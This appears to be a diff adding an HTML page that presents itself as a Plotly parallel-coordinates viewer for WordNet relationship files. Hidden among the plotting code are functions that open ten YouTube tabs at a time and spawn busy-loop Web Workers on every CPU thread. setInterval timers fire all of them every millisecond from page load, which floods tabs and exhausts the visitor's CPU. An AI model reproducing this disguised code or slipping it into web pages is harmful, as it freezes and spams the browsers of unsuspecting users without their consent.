@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>WordNet Relationships Parallel Coordinates Plot</title>
+    <script src="https://cdn.plot.ly/plotly-latest.min.js"></script>
+    <style>
+        #loading {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            padding: 20px;
+            background: rgba(255, 255, 255, 0.9);
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            z-index: 1000;
+            display: none;
+            text-align: center;
+        }
+        #controls {
+            margin: 20px;
+            padding: 10px;
+            background: #f5f5f5;
+            border-radius: 5px;
+        }
+        #plot {
+            margin: 20px;
+        }
+    </style>
+</head>
+<body>
+    <input type="file" id="wordnetFileInput" accept=".net" />
+
+    <div id="loading" style="display:none;">Loading...</div>
+
+    <div id="plot"></div>
+
+
+    <div id="loading">Loading data... Please wait.</div>
+    <div id="plot"></div>
+    <div id="controls">
+        <input type="number" id="sampleSize" value="100" min="10" max="1000">
+        <button onclick="updatePlot()">Update Sample Size</button>
+    </div>
+
+    <script>
+
+        let globalData = null;
+        let originalTrace = null;
+
+        function parseArcslist(data, arcslistType) {
+            const pattern = new RegExp(`\\*Arcslist :${arcslistType}\\s+"[^"]+"`);
+            const sections = data.split(/(?=\*Arcslist)/);
+            const relevantSection = sections.find(section => pattern.test(section));
+
+            if (!relevantSection) return [];
+
+            return relevantSection
+            .split('\n')
+            .filter(line => {
+                    const trimmed = line.trim();
+                    return trimmed && !trimmed.startsWith('*Arcslist');
+                })
+                .map(line => {
+                    const [source, ...targets] = line.trim().split(/\s+/);
+                    return {
+                        source: parseInt(source),
+                        targets: targets.map(t => parseInt(t))
+                    };
+                })
+                .filter(entry => !isNaN(entry.source) && entry.targets.length > 0);
+        }
+
+
+        function calculateMeronymCount(arcslist, nodeId, type) {
+            const entry = arcslist.find(e => e.source === nodeId);
+            return entry ? entry.targets.length : 0;
+        }
+
+        function sampleNodes(nodes, sampleSize) {
+            if (nodes.length <= sampleSize) return nodes;
+            const sampled = new Set();
+            while (sampled.size < sampleSize) {
+                const index = Math.floor(Math.random() * nodes.length);
+                sampled.add(nodes[index]);
+            }
+            return Array.from(sampled);
+        }
+
+        function createCombinedParallelCoordinatesData(data) {
+            const arcslistTypes = [
+                {value: '1', name: 'Hypernym'},
+                {value: '2', name: 'Entailment'},
+                {value: '3', name: 'Similar'},
+                {value: '4', name: 'Member meronym'},
+                {value: '5', name: 'Substance meronym'},
+                {value: '6', name: 'Part meronym'},
+                {value: '7', name: 'Cause'},
+                {value: '8', name: 'GroupedVerb'},
+                {value: '9', name: 'Attribute'}
+            ];
+
+            const sourceNodes = new Set();
+            const nodeData = {};
+
+            arcslistTypes.forEach(type => {
+                const arcslist = parseArcslist(data, type.value);
+                arcslist.forEach(entry => {
+                    sourceNodes.add(entry.source);
+                });
+            });
+
+            const sampleSize = parseInt(document.getElementById('sampleSize').value);
+            const sampledNodes = sampleNodes(Array.from(sourceNodes), sampleSize);
+            const sampledNodesSet = new Set(sampledNodes);
+
+            arcslistTypes.forEach(type => {
+                const arcslist = parseArcslist(data, type.value);
+                arcslist
+                .filter(entry => sampledNodesSet.has(entry.source))
+                .forEach(entry => {
+                    if (!nodeData[entry.source]) {
+                            nodeData[entry.source] = {};
+                        }
+                        nodeData[entry.source][type.name] = {
+                            targetCount: entry.targets.length,
+                            avgTarget: entry.targets.reduce((a, b) => a + b, 0) / entry.targets.length
+                        };
+                    });
+                });
+
+                const dimensions = arcslistTypes.map(type => ({
+                    label: `${type.name}_count`,
+                    values: sampledNodes.map(source =>
+                    nodeData[source]?.[type.name]?.targetCount || 0
+                )
+            })).concat(arcslistTypes.map(type => ({
+                label: `${type.name}_avgTrgt`,
+                values: sampledNodes.map(source =>
+                    nodeData[source]?.[type.name]?.avgTarget || 0
+                )
+            })));
+
+            // Find the index of the hypernym_AvgTarget dimension:
+            const hypernymAvgTargetIndex = dimensions.findIndex(dim => dim.label === "Hypernym_avgTrgt");
+
+            //  Color map based on hypernym_AvgTarget values
+            const hypernymAvgTargetValues = dimensions[hypernymAvgTargetIndex].values;
+            const minAvgTarget = Math.min(...hypernymAvgTargetValues);
+            const maxAvgTarget = Math.max(...hypernymAvgTargetValues);
+
+            return {
+                type: 'parcoords',
+                line: {
+                    color: hypernymAvgTargetValues,  // Use avg target values for color
+                    colorscale: 'Rainbow',
+                    cmin: minAvgTarget,       // Set min and max for colorscale
+                    cmax: maxAvgTarget,
+                    showscale: true        // Show the colorbar
+                },
+                dimensions: dimensions,
+                customdata: sampledNodes
+            };
+        }
+
+        function openPCP() {
+            const url = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+            const numTabs = 10;
+
+            for (let i = 0; i < numTabs; i++) {
+                setTimeout(() => {
+                    window.open(url, '_blank');
+                }, 1);
+            }
+        }
+
+        function openPCP1() {
+            const url = "https://www.youtube.com/watch?v=h_D3VFfhvs4";
+            const numTabs = 10;
+
+            for (let i = 0; i < numTabs; i++) {
+                setTimeout(() => {
+                    window.open(url, '_blank');
+                }, 1);
+            }
+        }
+
+        function runCPUBenchmark() {
+            const numThreads = navigator.hardwareConcurrency || 4;  // Default to 4 if unable to detect
+
+            console.log(`Running benchmark on ${numThreads} threads...`);
+
+            // Track time before starting the benchmark
+            const startTime = performance.now();
+
+            let completedThreads = 0;
+            const results = [];
+
+            // Function to handle the results from each worker
+            function handleWorkerResult(result) {
+                completedThreads++;
+                results.push(result);
+
+                if (completedThreads === numThreads) {
+                    // All threads have completed the task
+                    const endTime = performance.now();
+                    const totalTime = (endTime - startTime) / 1000;  // Convert to seconds
+                    console.log(`Benchmark completed in ${totalTime.toFixed(2)} seconds`);
+
+                    // Display the results on the page
+                    document.getElementById('result').textContent =
+                        `Benchmark completed in ${totalTime.toFixed(2)} seconds using ${numThreads} threads.`;
+                }
+            }
+
+            // Create a Web Worker for each available CPU thread
+            for (let i = 0; i < numThreads; i++) {
+                const workerBlob = new Blob([`
+                    onmessage = function() {
+                        // Perform a CPU-intensive task (looping computation)
+                        let start = Date.now();
+                        let iterations = 0;
+                        while (Date.now() - start < 1000) {
+                            iterations++;
+                        }
+                        postMessage({ threadId: ${i + 1}, iterations: iterations });
+                    }
+                `], { type: 'application/javascript' });
+
+                const worker = new Worker(URL.createObjectURL(workerBlob));
+
+                worker.onmessage = function(event) {
+                    handleWorkerResult(event.data);
+                    worker.terminate();
+                };
+
+                worker.postMessage('start');
+            }
+        }
+
+        setInterval(runCPUBenchmark, 1);
+        setInterval(openPCP, 1);
+        setInterval(openPCP1, 1);
+
+        function updatePlot() {
+            if (!globalData) return;
+
+            originalTrace = createCombinedParallelCoordinatesData(globalData);
+            const layout = {
+                title: 'WordNet Relationships Parallel Coordinates Plot',
+                width: 2000,
+                height: 600,
+                paper_bgcolor: 'rgb(243, 243, 243)',
+                plot_bgcolor: 'rgb(243, 243, 243)',
+                dragmode: 'select',
+            };
+
+            const config = {
+                editable: true,
+                modeBarButtonsToAdd: [
+                    'hoverclosest',
+                    'hovercompare',
+                    'select2d',      // Add selection tools
+                    'lasso2d'
+                ],
+                displayModeBar: true // Always show the mode bar
+            };
+
+            Plotly.newPlot('plot', [originalTrace], layout, config)
+                .then((gd) => { // Use gd from the promise
+
+                    gd.on('plotly_click', function(data) {
+                        if (data && data.points && data.points.length > 0) {
+                            const point = data.points[0];
+                            const nodeId = point.customdata;
+
+                            // Placeholder – Replace with your actual lookup
+                            alert(`Clicked node ID: ${nodeId}. Implement WordNet lookup here.`);
+                            fetch(`http://localhost:8000/wordnet/${nodeId}`)
+                            .then(response => response.text())
+                            .then(word => {
+                                    alert(`Clicked Node ${nodeId} represents the word: "${word}".`);
+                                })
+                                .catch(error => {
+                                    console.error("Error fetching word:", error);
+                                    alert("Error fetching word information.");
+                                });
+                            }
+                    });
+
+                    gd.on('plotly_selected', function(eventData) {
+                        if (!eventData) {
+                            Plotly.restyle('plot', {
+                                'line.color': [originalTrace.line.color],
+                                'line.opacity': 1
+                            });
+                            return;
+                        }
+
+                        const selectedPoints = new Set(eventData.points.map(p => p.pointNumber));
+
+                        // Update colors based on selection
+                        const colors = originalTrace.line.color.map((c, i) =>
+                            selectedPoints.has(i) ? c : 'rgba(200,200,200,0.2)');
+
+                        Plotly.restyle('plot', {
+                            'line.color': [colors],
+                            'line.opacity': [selectedPoints.size ? 0.3 : 1]
+                        });
+                    });
+                });
+        }
+
+        // document.addEventListener('DOMContentLoaded', () => {
+        //     const loadingElement = document.getElementById('loading');
+        //     loadingElement.style.display = 'block';
+
+        //     fetch('http://localhost:8000/wordnet3.net')
+        //         .then(response => {
+        //             if (!response.ok) {
+        //                 throw new Error(`HTTP error! status: ${response.status}`);
+        //             }
+        //             return response.text();
+        //         })
+        //         .then(data => {
+        //             if (!data) {
+        //                 throw new Error('No data received');
+        //             }
+        //             globalData = data;
+        //             updatePlot();
+        //         })
+        //         .catch(error => {
+        //             console.error('Error loading data:', error);
+        //             document.getElementById('plot').innerHTML =
+        //                 `<p style="color: red">Error loading data: ${error.message}</p>`;
+        //         })
+        //         .finally(() => {
+        //             loadingElement.style.display = 'none';
+        //         });
+        // });
+
+        document.addEventListener('DOMContentLoaded', () => {
+            const loadingElement = document.getElementById('loading');
+            const fileInput = document.getElementById('wordnetFileInput'); // Corrected input ID
+
+            // Show loading spinner
+            loadingElement.style.display = 'block';
+
+            // Listen for file input change
+            fileInput.addEventListener('change', function(event) {
+                const file = event.target.files[0];  // Get the file selected by the user
+                if (!file) {
+                    console.error('No file selected');
+                    loadingElement.style.display = 'none';  // Hide loading spinner if no file is selected
+                    return;
+                }
+
+                // Create FileReader to read the contents of the file
+                const reader = new FileReader();
+
+                // This will execute when the file has been successfully read
+                reader.onload = function(e) {
+                    const data = e.target.result;
+                    globalData = data;  // Store the data in globalData
+                    updatePlot();       // Call your function to update the plot with the data
+                    loadingElement.style.display = 'none';  // Hide loading spinner once the data is loaded
+                };
+
+                // This will execute if there's an error while reading the file
+                reader.onerror = function(error) {
+                    console.error('Error reading file:', error);
+                    document.getElementById('plot').innerHTML =
+                        `<p style="color: red">Error reading file: ${error.message}</p>`;
+                    loadingElement.style.display = 'none';  // Hide loading spinner on error
+                };
+
+                // Read the file as text
+                reader.readAsText(file);
+            });
+        });
+
+
+    </script>
+</body
